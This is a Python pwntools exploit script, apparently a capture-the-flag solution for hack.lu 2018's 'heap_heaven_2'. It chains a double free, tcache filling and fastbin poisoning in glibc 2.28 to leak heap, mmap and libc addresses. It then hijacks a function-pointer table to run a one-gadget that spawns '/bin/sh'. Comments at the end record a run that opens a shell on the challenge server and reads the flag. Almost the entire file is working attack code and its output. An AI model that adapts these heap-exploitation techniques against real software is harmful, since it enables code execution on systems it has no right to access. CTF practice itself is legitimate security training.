#!/usr/bin/env python2
# -*- coding: utf-8 -*-
import os

from pwn import *

context(arch="amd64", os="linux")

if not args["REMOTE"]:
    binary = ELF("./heap_heaven_2-2.28-4")  # https://github.com/integeruser/bowkin
    libc = ELF("libs/libc-x86_64-2.28-4.so")

    argv = [binary.path]
    envp = {"PWD": os.getcwd()}

    if args["GDB"]:
        io = gdb.debug(
            args=argv,
            env=envp,
            aslr=False,
            terminal=["tmux", "new-window"],
            gdbscript="""
                set follow-fork-mode parent
                continue
            """,
        )
    else:
        io = process(argv=argv, env=envp)
else:
    binary = ELF("./heap_heaven_2")
    libc = ELF("libs/libc-x86_64-2.28-4.so")

    io = remote("arcade.fluxfingers.net", 1809)

# by integeruser


def write(size, offset, data):
    io.sendlineafter("[5] : exit\n", "1")
    io.sendlineafter("How much do you want to write?\n", str(size))
    io.sendlineafter("At which offset?\n", str(offset))
    io.send(data)


def free(offset):
    io.sendlineafter("[5] : exit\n", "3")
    io.sendlineafter("At which offset do you want to free?\n", str(offset))


def leak(offset):
    io.sendlineafter("[5] : exit\n", "4")
    io.sendlineafter("At which offset do you want to leak?\n", str(offset))
    return io.recvn(6)


# 1. leaking an address from the heap

# store some fake chunks in the mmaped area
fake_chunk1 = fit(
    {0x00: p64(0x41424344), 0x08: p64(0x501), 0x10: "AAAAAAAA"}, length=0x500
)
fake_chunk2 = fit(
    {0x00: p64(0x41424344), 0x08: p64(0x41), 0x10: "BBBBBBBB"}, length=0x40
)
fake_chunk3 = fit(
    {0x00: p64(0x41424344), 0x08: p64(0x41), 0x10: "CCCCCCCC"}, length=0x40
)

payload = fake_chunk1 + fake_chunk2 + fake_chunk3
offset = 0
write(len(payload), offset, payload)

# free `fake_chunk1`, which goes into the unsorted bin
fake_chunk1_offset = offset + 0x10
free(fake_chunk1_offset)

# now, the `fd` and `bk` fields of `fake_chunk1` are populated with addresses from libc,
# pointing to addresses from the heap; use the leak functionality of the binary to print one of them
a_heap_addr = u64(leak(fake_chunk1_offset).ljust(8, "\0"))
heap_address = a_heap_addr - (0x55555555B290 - 0x55555555B000)
io.success("heap_address: %#x" % heap_address)


# 2. leaking an address from the mmaped area

# double free `fake_chunk2` so that its `fd` field points to itself
fake_chunk2_offset = offset + len(fake_chunk1) + 0x10
free(fake_chunk2_offset)
free(fake_chunk2_offset)

# again, use the leak functionality to print the `fd` field of `fake_chunk2`
# (the [:-1] is for skipping the newline character printed by `puts()`)
a_mmap_addr = u64(leak(fake_chunk2_offset)[:-1].ljust(8, "\0"))
mmap_address = a_mmap_addr - (0x9E52789510 - 0x0000009E52789000)
io.success("mmap_address: %#x" % mmap_address)


# 3. leaking an address from libc

# as said before, as a result of 1. the `fd` and `bk` fields of `fake_chunk1` contains
# addresses of libc; since we now know the base address of the mmaped page, we just
# write somewhere on the page (e.g. at offset 0x1000) a pointer to the `fd` field of `fake_chunk1`
# and use the leak functionality of the binary to print its value
fake_chunk1_fd_addr = mmap_address + offset + 0x10

payload = p64(fake_chunk1_fd_addr)
offset = 0x1000
write(len(payload), offset, payload)

# the address of libc we are going to print has a null least significative byte; thus,
# before printing it, we need to manually change the value of that byte (otherwise, `puts()`
# will only print an empty string)
write(1, fake_chunk1_offset, chr(0x41))

a_libc_addr = u64(leak(offset).ljust(8, "\0"))
a_libc_addr -= 0x41
libc.address = a_libc_addr - (0x7FFFF7FC6B00 - 0x7FFFF7E08000)
io.success("libc.address: %#x" % libc.address)


# 4. executing a one-gadget

# store some fake chunks in the mmaped area
fake_chunk4 = fit(
    {0x00: p64(0x41424344), 0x08: p64(0x21), 0x10: "DDDDDDDD"}, length=0x20
)
fake_chunk5 = fit(
    {0x00: p64(0x41424344), 0x08: p64(0x81), 0x10: "EEEEEEEE"}, length=0x80
)

payload = fake_chunk4 + fake_chunk5
offset = 0x1200
write(len(payload), offset, payload)

# free `fake_chunk4` some times to fill the tcache
fake_chunk4_offset = offset + 0x10
free(fake_chunk4_offset)
free(fake_chunk4_offset)
free(fake_chunk4_offset)
free(fake_chunk4_offset)
free(fake_chunk4_offset)
free(fake_chunk4_offset)
free(fake_chunk4_offset)

# the next `free()` will put `fake_chunk4` into the fast bin
free(fake_chunk4_offset)

# as the last step, we are going to free the chunk (allocated by the binary at the start
# of the program) that contains a pointer to the array of functions `bye()` and `menu()`

# by freeing this chunk, this pointer gets updated with the address of the chunk at the top
# of the fast bin (our fake chunk)

# in this way, at the next call of `menu()`, the binary will use a pointer to `fake_chunk4`
# to find the array of functions; instead of `menu()`, it will find the address of the one-gadget

# $ one_gadget libs/libc-x86_64-2.28-4.so
# . . .
# 0xe75f0 execve("/bin/sh", rsp+0x60, environ)
# constraints:
#   [rsp+0x60] == NULL
# . . .
one_gadget_addr = libc.address + 0xE75F0

payload = p64(one_gadget_addr)
write(len(payload), fake_chunk4_offset - 0x8, payload)

free(heap_address - mmap_address + (0x55555555B260 - 0x55555555B000))
# and enjoy the shell
io.interactive()
# $ ./heap_heaven_2.py REMOTE
# [*] '/home/vagrant/vbox/Heap-Heaven-2/heap_heaven_2'
#     Arch:     amd64-64-little
#     RELRO:    Full RELRO
#     Stack:    Canary found
#     NX:       NX enabled
#     PIE:      PIE enabled
# [*] '/home/vagrant/vbox/Heap-Heaven-2/libs/libc-x86_64-2.28-4.so'
#     Arch:     amd64-64-little
#     RELRO:    Full RELRO
#     Stack:    Canary found
#     NX:       NX enabled
#     PIE:      PIE enabled
# [+] Opening connection to arcade.fluxfingers.net on port 1809: Done
# [+] heap_address: 0x5571b44c7000
# [+] mmap_address: 0x871155b000
# [+] libc.address: 0x7f63b92f0000
# [*] Switching to interactive mode
# \x89��Fc: cannot set terminal process group (10647): Inappropriate ioctl for device
# \x89��Fc: no job control in this shell
# [chall@hacklu18 ~]$ $ ls
# flag  heap_heaven_2
# [chall@hacklu18 ~]$ $ cat flag
# flag{th1s_w4s_still_ez_h3ap_stuff_r1ght?!}
